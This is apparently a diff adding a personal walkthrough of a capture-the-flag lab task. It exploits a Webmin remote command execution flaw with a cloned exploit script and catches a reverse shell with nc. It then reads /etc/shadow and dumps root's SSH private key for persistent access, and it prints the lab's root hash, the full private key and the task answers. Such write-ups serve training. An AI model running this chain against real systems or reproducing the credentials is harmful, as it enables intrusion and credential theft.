@@ -207,6 +207,176 @@
       10.200.106.200  thomaswreath.thm
 
   
+  
+***Task 6  Webserver Exploitation:***
+      
+   In the previous task we found a vulnerable service[1][2] running on the target which will give us the ability to execute commands on the target.
+
+   The next step would usually be to find an exploit for this vulnerability. There are often exploits available online for known vulnerabilities (and we will cover searching for    these in an upcoming task!), however, in this instance, an exploit is provided here.
+
+   Start by cloning the repository. This can be done with the following command:
+
+    - git clone https://github.com/MuirlandOracle/CVE-2019-15107
+
+   This creates a local copy of the exploit on our attacking machine. Navigate into the folder then install the required Python libraries:
+
+    - cd CVE-2019-15107 && pip3 install -r requirements.txt
+
+   If this doesn't work, you may need to install pip before downloading the libraries. This can be done with:
+ 
+    - sudo apt install python3-pip
+
+  The script should already be executable, but if not, add the executable bit (chmod +x ./CVE-2019-15107.py).
+
+  Never run an unknown script from the internet! Read through the code and see if you can get an idea of what it's doing. (Don't worry if you aren't familiar with Python -- in     this case the exploit was coded by the author of this content and is being run in a lab environment, so you can infer that it isn't malicious. It is, however, good practice to   read through scripts before running them).
+
+  Once you're satisfied that the script will do what it says it will, run the exploit against the target!
+
+    - ./CVE-2019-15107.py TARGET_IP
+
+  - What is Webmin?
+      Webmin is a web-based interface for system administration for Unix. Using any modern web browser, you can setup user accounts, Apache, DNS, file sharing and much more.        Webmin removes the need to manually edit Unix configuration files like /etc/passwd, and lets you manage a system from the console or remotely, the official website says. 
+
+   Which user was the server running as?
+ 
+   - root
+
+   Success! We won't need to escalate privileges here, so we can move on to the next step in the exploitation process.
+
+   Before we do though: nice though this pseudoshell is, it's not a full reverse shell.
+
+   Get a reverse shell from the target. You can either do this manually, or by typing shell into the pseudoshell and following the instructions given.
+
+  - No answer needed
+
+   Optional: Stabilise the reverse shell. There are several techniques for doing this detailed here.
+
+   - No answer needed
+
+   Now for a little post-exploitation!
+
+  What is the root user's password hash?
+
+  - $6$i9vT8tk3SoXXxK2P$HDIAwho9FOdd4QCecIJKwAwwh8Hwl.BdsbMOUAd3X/chSCvrmpfy.5lrLgnRVNq6/6g0PxK9VqSdy47/qKXad1
+
+  You won't be able to crack the root password hash, but you might be able to find a certain file that will give you consistent access to the root user account through one of     the other services on the box.
+
+  What is the full path to this file?
+
+  - /root/.ssh/id_rsa
+  
+  Download the key (copying and pasting it to a file on your own Attacking Machine works), then use the command chmod 600 KEY_NAME (substituting in the name of the key) to         obtain persistent access to the box.
+   Run the exploit and obtain a pseudoshell on the target!
+
+
+        ┌──(root💀DESKTOP-7K6I4IF)-[~/Documents/Wreath/CVE-2019-15107]
+        └─# ./CVE-2019-15107.py 10.200.106.200
+
+        __        __   _               _         ____   ____ _____ 
+        \ \      / /__| |__  _ __ ___ (_)_ __   |  _ \ / ___| ____|
+         \ \ /\ / / _ \ '_ \| '_ ` _ \| | '_ \  | |_) | |   |  _|  
+          \ V  V /  __/ |_) | | | | | | | | | | |  _ <| |___| |___ 
+           \_/\_/ \___|_.__/|_| |_| |_|_|_| |_| |_| \_\____|_____|
+
+                                                @MuirlandOracle
+
+        # PSEUDOSHELL:
+        [*] Server is running in SSL mode. Switching to HTTPS
+        [+] Connected to https://10.200.106.200:10000/ successfully.
+        [+] Server version (1.890) should be vulnerable! 
+        [+] Benign Payload executed!
+
+        [+] The target is vulnerable and a pseudoshell has been obtained. 
+        Type commands to have them executed on the target.
+        [*] Type 'exit' to exit. 
+        [*] Type 'shell' to obtain a full reverse shell (UNIX only).
+        #id
+        uid=0(root) gid=0(root) groups=0(root) context=system_u:system_r:initrc_t:s0
+        #shell
+        sh-4.4# cat /etc/shadow
+        cat /etc/shadow
+        root:$6$i9vT8tk3SoXXxK2P$HDIAwho9FOdd4QCecIJKwAwwh8Hwl.BdsbMOUAd3X/chSCvrmpfy.5lrLgnRVNq6/6g0PxK9VqSdy47/qKXad1::0:99999:7:::
+        ┌──(root💀DESKTOP-7K6I4IF)-[~]
+         └─# nc -lnvp 4444
+         Listening on 0.0.0.0 4444
+         Connection received on 10.200.106.200 51376
+         sh: cannot set terminal process group (1781): Inappropriate ioctl for device
+         sh: no job control in this shell
+
+        sh-4.4# cat /root/.ssh/id_rsa
+        cat /root/.ssh/id_rsa
+                   -----BEGIN OPENSSH PRIVATE KEY-----
+        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
+                      -----END OPENSSH PRIVATE KEY-----
+
+
+        ┌──(root💀DESKTOP-7K6I4IF)-[~/Documents/Wreath]
+        └─# chmod 600 KEY_rsa 
+
+         ┌──(root💀DESKTOP-7K6I4IF)-[~/Documents/Wreath]
+         └─#ssh -i 'KEY_rsa' root@IP
+
+         
+         [root@prod-serv tmp]#
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
